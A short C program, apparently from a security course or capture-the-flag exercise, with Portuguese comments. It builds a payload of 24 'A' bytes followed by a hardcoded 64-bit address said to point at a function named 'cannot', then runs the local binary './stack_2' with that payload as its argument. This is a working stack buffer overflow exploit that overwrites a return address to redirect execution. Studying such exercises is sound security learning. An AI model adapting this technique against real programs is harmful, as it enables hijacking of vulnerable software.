#include <malloc.h> 
#include <unistd.h> 
 
int main() 
{ 
    int i, A, B, C, D, E, F, G, H, I; 
    char *buf  = (char *) malloc(1000); 
    char **arr = (char **) malloc(10); 
 
    A = 24;    // Preenche os primeiros 16 bytes do buffer
    B = 0x3c;  // Byte menos significativo do endereço de cannot
    C = 0x47; 
    D = 0x55; 
    E = 0x55; 
    F = 0x55; 
    G = 0x55; 
    H = 0x00;  // Preenche com 0s para alinhar a arquitetura de 64 bits
    I = 0x00; 
    for (i=0; i<A; i++) 
        buf[i] = 'A'; 
 
    buf[A]   = B; 
    buf[A+1] = C; 
    buf[A+2] = D; 
    buf[A+3] = E; 
    buf[A+4] = F; 
    buf[A+5] = G; 
    buf[A+6] = H; 
    buf[A+7] = I; 
 
    arr[0] = "./stack_2"; 
    arr[1] = buf; 
    arr[2] = 0x00; 
    execv("./stack_2", arr); 
}